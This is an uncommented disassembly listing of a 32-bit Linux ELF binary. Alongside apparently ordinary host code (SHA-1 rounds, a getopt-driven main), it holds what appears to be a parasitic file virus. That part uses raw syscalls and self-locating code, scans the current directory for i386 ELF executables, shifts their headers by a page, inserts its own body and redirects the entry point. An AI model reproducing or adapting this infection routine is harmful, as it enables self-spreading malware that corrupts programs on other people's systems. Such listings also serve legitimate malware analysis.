mov dword [var_108h], ebx
mov edi, dword [var_ch]
mov dword [edi + 0x2c], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov ebx, dword [var_100h]
xor ebx, dword [var_ech]
mov edi, dword [var_d4h]
xor ebx, edi
mov edi, dword [var_c4h]
xor ebx, edi
rol ebx, 1
mov dword [var_10ch], ebx
mov edi, dword [var_ch]
mov dword [edi + 0x30], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov ebx, dword [var_104h]
xor ebx, dword [var_f0h]
mov edi, dword [var_d8h]
xor ebx, edi
mov edi, dword [var_cch]
xor ebx, edi
rol ebx, 1
mov edi, dword [var_ch]
mov dword [edi + 0x34], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov ebx, dword [var_108h]
xor ebx, dword [var_f4h]
mov edi, dword [var_dch]
xor ebx, edi
mov edi, dword [var_d4h]
xor ebx, edi
rol ebx, 1
mov edi, dword [var_ch]
mov dword [edi + 0x38], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov ebx, dword [var_10ch]
xor ebx, dword [var_f8h]
mov edi, dword [var_e0h]
xor ebx, edi
mov edi, dword [var_d8h]
xor ebx, edi
rol ebx, 1
mov edi, dword [var_ch]
mov dword [edi + 0x3c], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add esi, eax
rol ecx, 0x1e
mov ebx, dword [arg_8h]
add dword [ebx], esi
mov edi, dword [var_15ch]
add dword [ebx + 4], edi
add dword [ebx + 8], ecx
mov edi, dword [var_4h]
add dword [ebx + 0xc], edi
mov edi, dword [var_8h]
add dword [ebx + 0x10], edi
lea esp, [var_168h]
pop ebx
pop esi
pop edi
leave
ret
pop ebx
add ebx, 0x148f
call fcn.08048c00
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
cmp dword [0x804cafc], 0
jne 0x8048c44
jmp 0x8048c1d
mov esi, esi
lea edx, [eax + 4]
mov dword [0x804caf8], edx
mov eax, dword [eax]
call eax
mov eax, dword [0x804caf8]
cmp dword [eax], 0
jne 0x8048c10
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048c3a
push section..eh_frame
call sym.imp.__deregister_frame_info
mov dword [0x804cafc], 1
leave
ret
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
call fcn.0804c8c8
test eax, eax
je 0x804ca6f
lea eax, [var_1004h]
push eax
call fcn.0804c770
mov edi, eax
add esp, 4
test edi, edi
je 0x804ca6f
call edi
test eax, eax
jne 0x804ca6f
push dword [var_1004h]
push edi
call fcn.0804c934
push 0x18
call fcn.0804bb50
add esp, 0xc
test eax, eax
jne 0x804ca6f
push 0x1000
lea esi, [var_1000h]
push esi
push 0xb7
call fcn.0804bb70
push 8
lea ebx, [var_100ch]
push ebx
push 3
call fcn.0804be04
push ebx
push 0xc
call fcn.0804bb5c
add esp, 0x20
push dword [var_1004h]
push edi
call fcn.0804c934
push esi
push 0xc
call fcn.0804bb5c
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x80
push esi
push ebx
push 0x80
lea esi, [var_80h]
push esi
push 2
call fcn.0804be04
push 0
push 0
push esi
push 5
call fcn.0804bb88
mov ebx, eax
add esp, 0x1c
test ebx, ebx
jl 0x804c909
push 0x80
push esi
push ebx
push 3
call fcn.0804bb88
add esp, 0x10
push ebx
push 6
call fcn.0804bb5c
push esi
call fcn.0804bd64
cmp eax, 0x12b
jg 0x804c924
xor eax, eax
jmp 0x804c929
mov esi, esi
mov eax, 1
lea esp, [var_88h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x47c
push edi
push esi
push ebx
mov dword [var_478h], 0
lea esi, [var_400h]
push 0x400
push esi
push 0
call fcn.0804be04
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [esi + ecx - 1]
push 0x14
call fcn.0804bb50
mov edx, eax
push edx
call fcn.0804bd24
mov edx, eax
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ecx, [esi + ecx - 1]
add edx, ecx
push 5
push edx
push 1
call fcn.0804be04
add esp, 0x20
push ebx
push 0x14
call fcn.0804bb50
add esp, 4
mov edx, eax
push edx
call fcn.0804c71c
push 0
push 0
push esi
push 5
call fcn.0804bb88
mov ebx, eax
add esp, 0x18
test ebx, ebx
jl 0x804c894
push 0x34
lea eax, [var_474h]
push eax
push ebx
call fcn.0804bbdc
add esp, 0xc
cmp eax, 1
jne 0x804c894
push 0
push dword [var_468h]
push ebx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c894
lea eax, [var_440h]
push eax
push ebx
push 0x6c
call fcn.0804bb70
add esp, 0xc
test eax, eax
jl 0x804c894
mov eax, dword [var_468h]
mov edi, dword [var_42ch]
sub edi, eax
push edi
call fcn.0804bba8
mov dword [var_478h], eax
add esp, 4
test eax, eax
je 0x804c894
push edi
push eax
push ebx
call fcn.0804bbdc
mov edx, eax
add esp, 0xc
cmp edx, 1
jne 0x804c894
mov eax, dword [arg_8h]
mov dword [eax], edi
push ebx
push 6
call fcn.0804bb5c
mov eax, dword [var_478h]
jmp 0x804c8bd
nop
cmp ebx, 0xffffffff
je 0x804c8a4
push ebx
push 6
call fcn.0804bb5c
add esp, 8
cmp dword [var_478h], 0
je 0x804c8bb
mov eax, dword [var_478h]
push eax
push 0x2d
call fcn.0804bb5c
xor eax, eax
lea esp, [var_488h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x130
push edi
push esi
push ebx
lea edx, [var_12ch]
mov dword [var_130h], edx
lea ebx, [var_122h]
mov esi, 0xc8
mov byte [var_12ch], 0x2e
mov byte [var_12bh], 0
push 0
push 0
push edx
push 5
call fcn.0804bb88
mov edi, eax
add esp, 0x10
test edi, edi
jge 0x804c9b5
mov eax, 0xffffffff
jmp 0x804c9d5
lea esi, [esi]
test esi, esi
jl 0x804c9cd
push ebx
call fcn.0804bce4
add eax, ebx
add esp, 4
cmp byte [eax - 2], 0x70
jne 0x804c99f
cmp byte [eax - 1], 0x73
je 0x804c9b5
mov edx, dword [arg_ch]
push edx
mov edx, dword [arg_8h]
push edx
push ebx
call fcn.0804c034
add esp, 0xc
test eax, eax
jne 0x804c9b5
dec esi
push 1
mov edx, dword [var_130h]
push edx
push edi
push 0x59
call fcn.0804bb88
add esp, 0x10
test eax, eax
jg 0x804c984
push edi
push 6
call fcn.0804bb5c
lea esp, [var_13ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
int 0x80
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
mov eax, dword [arg_10h]
mov ebx, dword [arg_14h]
mov ecx, dword [arg_18h]
int 0x80
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.0804bdd4
mov esi, eax
test ebx, ebx
jle 0x804be27
nop
cmp byte [esi], 0
jne 0x804be22
dec ebx
inc esi
test ebx, ebx
jg 0x804be1c
mov eax, dword [arg_10h]
push eax
push 0
mov edi, dword [arg_ch]
push edi
call fcn.0804bcc0
mov edx, esi
mov edi, edx
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov eax, dword [arg_10h]
cmp ecx, eax
ja 0x804be64
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [ecx - 1]
jmp 0x804be67
lea esi, [esi]
mov ebx, dword [arg_10h]
xor ecx, ecx
cmp ecx, ebx
jge 0x804be95
lea esi, [esi]
mov dl, byte [ecx + esi]
test dl, dl
je 0x804be90
mov byte [var_4h], dl
and byte [var_4h], 0xf0
sub dl, byte [var_4h]
add byte [var_4h], 0xf
mov al, byte [var_4h]
sub al, dl
mov edi, dword [arg_ch]
mov byte [ecx + edi], al
inc ecx
cmp ecx, ebx
jl 0x804be70
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
int 0x80
pop ebx
leave
ret
pop eax
sub eax, 0x4e
jmp 0x804bb42
call fcn.0804bb35
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
push edx
mov eax, dword [arg_14h]
mov ebx, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_20h]
int 0x80
pop edx
pop ecx
pop ebx
leave
ret
pop eax
jmp loc.0804bdff
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.0804bdd4
mov esi, eax
test ebx, ebx
jle 0x804be27
nop
cmp byte [esi], 0
jne 0x804be22
dec ebx
inc esi
test ebx, ebx
jg 0x804be1c
mov eax, dword [arg_10h]
push eax
push ebp
mov ebp, esp
jmp 0x804bddc
pop eax
jmp loc.0804bdff
call fcn.0804bdd9
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [eax], al
and byte [edx + 0x77], ch
push 0
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [edx + 0x7f], bh
jnp 0x804be5d
bound ebp, qword [edx]
and byte [arg_66h], ch
popal
add cl, cl
leave
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [arg_10h]
mov cl, byte [arg_ch]
xor eax, eax
cmp eax, edx
jge 0x804bcdc
nop
mov byte [eax + ebx], cl
inc eax
cmp eax, edx
jl 0x804bcd4
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_ch]
push dword [arg_10h]
push ebx
push dword [arg_8h]
push 0x13
call fcn.0804bb88
cmp eax, ebx
jne 0x804bc84
mov eax, 1
jmp 0x804bc86
xor eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 3
call fcn.0804bb88
add esp, 0x10
cmp eax, ebx
jne 0x804bc04
mov eax, 1
jmp 0x804bc18
test eax, eax
jg 0x804bc10
test ebx, ebx
jle 0x804bc10
xor eax, eax
jmp 0x804bc18
sub ebx, eax
add byte [esi], al
jmp 0x804bbec
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
cmp byte [edx], 0x7f
jne 0x804c030
cmp byte [edx + 1], 0x45
jne 0x804c030
cmp byte [edx + 2], 0x4c
jne 0x804c030
cmp byte [edx + 3], 0x46
jne 0x804c030
cmp word [edx + 0x10], 2
jne 0x804c030
mov ax, word [edx + 0x12]
cmp ax, 3
je 0x804c01c
cmp ax, 6
jne 0x804c030
cmp dword [edx + 0x14], 1
jne 0x804c030
cmp word [edx + 0xa], 1
ja 0x804c030
mov eax, 1
jmp 0x804c032
xor eax, eax
leave
ret
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
mov eax, dword [arg_40h]
xor ebx, ebx
movzx edx, word [arg_38h]
cmp ebx, edx
jge 0x804bedb
lea esi, [esi]
cmp dword [eax + 4], 0
jne 0x804becc
cmp dword [eax], 1
jne 0x804bed3
mov esi, eax
jmp 0x804bed3
nop
cmp dword [eax], 1
jne 0x804bed3
mov ecx, eax
add eax, 0x20
inc ebx
cmp ebx, edx
jl 0x804bebc
mov edx, dword [esi + 8]
mov eax, edx
add eax, dword [esi + 0x10]
mov ecx, dword [ecx + 8]
sub ecx, eax
mov eax, ecx
cmp eax, 0xfff
jle 0x804befc
mov eax, 3
jmp 0x804bfda
nop
mov eax, dword [arg_24h]
mov ecx, eax
sub ecx, edx
add ecx, dword [esi + 4]
add edx, dword [esi + 0x14]
sub edx, eax
lea eax, [edx - 1]
cmp eax, 0xfff
jbe 0x804bf20
mov eax, 2
jmp 0x804bfda
nop
cmp edx, 0x1000
ja 0x804bf2c
mov esi, edx
jmp 0x804bf31
mov esi, 0x1000
push 0
push ecx
mov edi, dword [arg_8h]
push edi
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804bfc9
push esi
lea edi, [var_1000h]
mov dword [var_100ch], edi
push edi
mov edi, dword [arg_8h]
push edi
call fcn.0804bbdc
cmp eax, 1
jne 0x804bfc9
xor ebx, ebx
lea eax, [esi - 4]
cmp ebx, eax
jge 0x804bfc9
mov edi, dword [var_100ch]
mov dword [var_1008h], edi
mov dword [var_1004h], eax
nop
mov edi, dword [var_100ch]
mov esi, dword [edi]
mov edi, dword [var_1008h]
cmp byte [edi + ebx + 3], 0
je 0x804bfba
xor ecx, ecx
movzx edx, word [arg_3ch]
cmp ecx, edx
jge 0x804bfba
mov eax, edx
mov edx, dword [arg_44h]
add edx, 4
nop
cmp esi, dword [edx + 8]
jne 0x804bfb2
cmp dword [edx], 1
je 0x804bfd0
add edx, 0x28
inc ecx
cmp ecx, eax
jl 0x804bfa8
inc dword [var_100ch]
inc ebx
cmp ebx, dword [var_1004h]
jl 0x804bf80
mov eax, 0xffffffff
jmp 0x804bfda
mov eax, dword [arg_48h]
mov dword [eax], esi
mov eax, 1
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 4
call fcn.0804bb88
add esp, 0x10
cmp eax, ebx
jne 0x804bc48
mov eax, 1
jmp 0x804bc5c
test eax, eax
jg 0x804bc54
test ebx, ebx
jle 0x804bc54
xor eax, eax
jmp 0x804bc5c
sub ebx, eax
add byte [esi], al
jmp 0x804bc30
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, 0xf86
leave
ret
push ebp
mov ebp, esp
jmp 0x804bb3d
pop eax
sub eax, 0x4e
jmp 0x804bb42
call fcn.0804bb35
push ebp
mov ebp, esp
mov eax, 0x21
inc eax
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push esi
push ebx
mov esi, dword [arg_8h]
xor ecx, ecx
test esi, esi
jg 0x804bd3c
mov eax, 1
jmp 0x804bd5d
mov ebx, 0x66666667
lea esi, [esi]
mov eax, esi
imul ebx
sar edx, 2
sar esi, 0x1f
mov dword [var_4h], esi
mov esi, edx
sub esi, dword [var_4h]
inc ecx
test esi, esi
jg 0x804bd44
mov eax, ecx
lea esp, [var_ch]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
mov edi, dword [arg_ch]
push ebx
call fcn.0804bd24
lea ecx, [eax - 1]
test ecx, ecx
jl 0x804c768
mov esi, 0x66666667
lea esi, [esi]
mov eax, ebx
imul esi
sar edx, 2
mov dword [var_4h], ebx
sar dword [var_4h], 0x1f
sub edx, dword [var_4h]
lea eax, [edx + edx*4]
add eax, eax
sub ebx, eax
mov dword [var_4h], ebx
mov ebx, edx
mov al, byte [var_4h]
add al, 0x30
mov byte [ecx + edi], al
dec ecx
jns 0x804c740
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
mov ebx, dword [arg_8h]
push 0
push 0x2d
call fcn.0804bb5c
mov esi, eax
add ebx, esi
push ebx
push 0x2d
call fcn.0804bb5c
cmp eax, esi
je 0x804bbd0
mov eax, esi
jmp 0x804bbd2
lea esi, [esi]
xor eax, eax
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
push edi
push esi
push ebx
xor esi, esi
mov dword [var_8h], 0
mov edi, dword [arg_8h]
mov al, byte [edi]
jmp 0x804bd87
lea esi, [esi]
inc esi
mov edi, dword [arg_8h]
mov al, byte [esi + edi]
add al, 0xd0
cmp al, 9
jbe 0x804bd80
xor ebx, ebx
cmp ebx, esi
jge 0x804bdc6
lea edi, [esi - 1]
mov dword [var_4h], edi
lea esi, [esi]
mov edi, dword [arg_8h]
movsx eax, byte [ebx + edi]
add eax, 0xffffffd0
xor ecx, ecx
mov edx, dword [var_4h]
sub edx, ebx
cmp ecx, edx
jge 0x804bdbe
lea esi, [esi]
lea eax, [eax + eax*4]
add eax, eax
inc ecx
cmp ecx, edx
jl 0x804bdb4
add dword [var_8h], eax
inc ebx
cmp ebx, esi
jl 0x804bd9c
mov eax, dword [var_8h]
lea esp, [var_14h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
xor eax, eax
cmp byte [edx], 0
je 0x804bcfb
lea esi, [esi]
inc edx
inc eax
cmp byte [edx], 0
jne 0x804bcf4
leave
ret
push ebp
mov ebp, esp
sub esp, 0xf8
push edi
push esi
push ebx
lea eax, [var_b4h]
push eax
mov ecx, dword [arg_8h]
push ecx
push 0x6a
call fcn.0804bb70
add esp, 0xc
test eax, eax
jl 0x804c709
mov eax, dword [var_94h]
mov dword [var_bch], eax
mov eax, dword [var_8ch]
lea ecx, [var_bch]
mov dword [var_ech], ecx
mov dword [ecx + 4], eax
push 0
push 2
mov ecx, dword [arg_8h]
push ecx
push 5
call fcn.0804bb88
mov dword [var_c4h], eax
add esp, 0x10
test eax, eax
jl 0x804c6f2
push 0x34
lea ecx, [var_74h]
mov dword [var_f4h], ecx
mov dword [var_c8h], ecx
push ecx
mov ecx, dword [var_c4h]
push ecx
call fcn.0804bbdc
add esp, 0xc
test eax, eax
je 0x804c6f2
mov ecx, dword [var_f4h]
push ecx
call fcn.0804bfe8
add esp, 4
test eax, eax
je 0x804c6f2
mov dword [var_cch], esp
movzx edi, word [var_48h]
movzx eax, word [var_44h]
mov dword [var_d0h], edi
shl dword [var_d0h], 5
sub esp, dword [var_d0h]
mov dword [var_d4h], esp
xor ebx, ebx
mov dword [var_d8h], 0
lea eax, [eax + eax*4]
shl eax, 3
mov dword [var_e4h], eax
sub esp, eax
mov dword [var_e8h], esp
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bbdc
add esp, 0xc
test eax, eax
je 0x804c6ec
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bbdc
add esp, 0xc
test eax, eax
je 0x804c6ec
mov dword [var_f8h], 0
cmp ebx, edi
jge 0x804c1f7
mov esi, dword [var_d4h]
add esi, 4
mov eax, dword [var_d4h]
xor edx, edx
mov esi, esi
cmp dword [esi + edx], 0
jne 0x804c1d8
cmp dword [eax], 1
jne 0x804c1e3
mov ebx, eax
jmp 0x804c1e3
nop
cmp dword [eax], 1
jne 0x804c1e3
mov dword [var_d8h], eax
add eax, 0x20
add edx, 0x20
inc dword [var_f8h]
cmp dword [var_f8h], edi
jl 0x804c1c8
test ebx, ebx
je 0x804c6ec
cmp dword [var_d8h], 0
je 0x804c6ec
mov ecx, dword [ebx + 0x10]
mov dword [var_dch], ecx
mov ecx, dword [ebx + 4]
add dword [var_dch], ecx
mov ecx, dword [ebx + 0x14]
mov dword [var_e0h], ecx
mov ecx, dword [ebx + 8]
add dword [var_e0h], ecx
lea ecx, [var_c0h]
mov dword [var_f0h], ecx
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_d4h]
push ecx
add esp, 0xffffffcc
mov edi, esp
mov esi, dword [var_c8h_2]
cld
mov ecx, 0xd
rep movsd dword es:[edi], dword ptr [esi]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bea0
add esp, 0x44
cmp eax, 1
je 0x804c54c
jle 0x804c6ec
cmp eax, 2
je 0x804c5a8
cmp eax, 3
jne 0x804c6ec
mov dword [var_f8h], 0
cmp word [var_48h], 0
je 0x804c307
mov ebx, dword [var_d4h]
add ebx, 0x14
mov esi, dword [var_d4h]
add esi, 0x10
mov edx, dword [var_d4h]
add edx, 4
xor edi, edi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jb 0x804c2cd
add eax, 0x1000
mov dword [edx], eax
test eax, eax
jne 0x804c2e9
mov ecx, dword [var_d4h]
cmp dword [ecx + edi], 1
jne 0x804c2e9
add dword [esi], 0x1000
add dword [ebx], 0x1000
add ebx, 0x20
add esi, 0x20
add edx, 0x20
add edi, 0x20
inc dword [var_f8h]
movzx eax, word [var_48h]
cmp dword [var_f8h], eax
jl 0x804c2bc
mov dword [var_f8h], 0
movzx esi, word [var_44h]
cmp dword [var_f8h], esi
jge 0x804c34e
mov edx, dword [var_e8h]
add edx, 0x10
mov esi, esi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jbe 0x804c33d
add eax, 0x1000
mov dword [edx], eax
movzx esi, word [var_44h]
add edx, 0x28
inc dword [var_f8h]
cmp dword [var_f8h], esi
jl 0x804c328
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
mov edi, esp
mov ebx, dword [var_a0h]
sub ebx, dword [var_dch]
mov eax, ebx
and eax, 0x1fffffff
add eax, 3
and eax, 0x3ffffffc
sub esp, eax
mov esi, esp
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bbdc
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
push 0
mov eax, dword [var_dch]
add eax, 0x1000
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
cmp eax, 1
jne 0x804c6ec
mov esp, edi
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
call fcn.0804bb44
push eax
call fcn.0804bb30
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
push 0
call fcn.0804bb24
add eax, dword [var_dch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
push 4
lea eax, [var_5ch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
mov word [var_6ah], 2
mov ecx, dword [var_a0h]
add ecx, 0x1000
mov dword [var_68h], ecx
mov ecx, dword [var_e0h]
mov dword [var_5ch], ecx
mov eax, dword [var_54h]
cmp eax, dword [var_dch]
jb 0x804c523
add eax, 0x1000
mov dword [var_54h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
push 0x34
mov ecx, dword [var_f4h_2]
jmp 0x804c67a
nop
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
cmp word [var_6ah], 1
ja 0x804c6e7
mov eax, dword [ebx + 0x14]
add eax, dword [ebx + 8]
add eax, 0xfffff000
mov dword [var_5ch], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
push 0x34
mov ecx, dword [var_c8h_2]
jmp 0x804c5fe
lea esi, [esi]
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
mov edx, dword [ebx + 0x14]
add edx, dword [ebx + 8]
mov eax, dword [var_5ch]
mov dword [var_c0h], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
add edx, 0xfffff000
mov dword [var_5ch], edx
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
push 0x34
mov ecx, dword [var_f4h_2]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
push 0
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
call fcn.0804bb44
push eax
call fcn.0804bb30
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
push 0
call fcn.0804bb24
add eax, esi
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
push 4
mov ecx, dword [var_f0h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
push 0
push dword [var_68h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc64
add esp, 0xc
test eax, eax
je 0x804c6ec
mov ecx, dword [var_f4h]
push ecx
mov ecx, dword [var_ch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0804bc20
add esp, 0xc
cmp eax, 1
jne 0x804c6ec
mov ecx, dword [var_c4h_2]
push ecx
push 6
call fcn.0804bb5c
mov ecx, dword [var_ech_2]
push ecx
mov ecx, dword [var_8h]
push ecx
push 0x1e
call fcn.0804bb70
test eax, eax
jl 0x804c6ec
xor eax, eax
jmp 0x804c70e
nop
mov esp, dword [var_cch_2]
cmp dword [var_c4h], 0xffffffff
je 0x804c709
mov ecx, dword [var_c4h]
push ecx
push 6
call fcn.0804bb5c
mov eax, 0xffffffff
lea esp, [var_104h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.08048901
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov dword [0x804cb24], 1
push 0
call sym.imp.alarm
leave
ret
push ebp
mov ebp, esp
push 1
call sym.imp.exit
push ebp
mov ebp, esp
push 0
call sym.imp.wait
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
push 0x804cd60
push 2
push 0
call sym.imp.tcsetattr
push ebx
push str.Got_signal__d__exiting..._n
push dword [obj.stderr]
call sym.imp.fprintf
push 0
call sym.imp.exit
push ebp
mov ebp, esp
sub esp, 0x168
push edi
push esi
push ebx
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
mov dword [var_154h], 0
mov dword [var_13ch], 0
mov dword [var_140h], 0
mov dword [var_144h], 2
mov dword [var_148h], 5
mov dword [var_14ch], 0xa
lea eax, [var_118h]
mov dword [var_160h], eax
mov edi, eax
mov eax, dword [var_154h]
cld
mov ecx, 5
rep stosd dword es:[edi], eax
stosw word es:[edi], ax
push 0
call sym.imp.time
mov edx, eax
push edx
call sym.imp.srand
push str._dev_null
push 0x804b9ac
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x14
jmp 0x80494ca
lea esi, [esi]
mov edx, dword [obj.optarg]
test edx, edx
je 0x8049691
and edi, 0xdf
add edi, 0xffffffbd
cmp edi, 0x11
ja case.0x804946c.69
jmp dword [edi*4 + 0x804baa8]
mov dword [var_154h], edx
jmp 0x80494ca
nop
lea esi, [esi]
lea eax, [var_13ch]
push eax
push 0x804b9c9
push edx
call sym.imp.sscanf
add esp, 0xc
cmp eax, 1
je 0x80494ca
jmp 0x8049691
nop
lea eax, [var_140h]
jmp 0x8049486
lea eax, [var_144h]
jmp 0x8049486
lea eax, [var_148h]
jmp 0x8049486
lea eax, [var_14ch]
jmp 0x8049486
push dword [ebx]
call fcn.08048ce0
add esp, 4
push str.h:H:s:S:d:D:i:I:t:T:C:c:
push ebx
push esi
call sym.imp.getopt
mov edi, eax
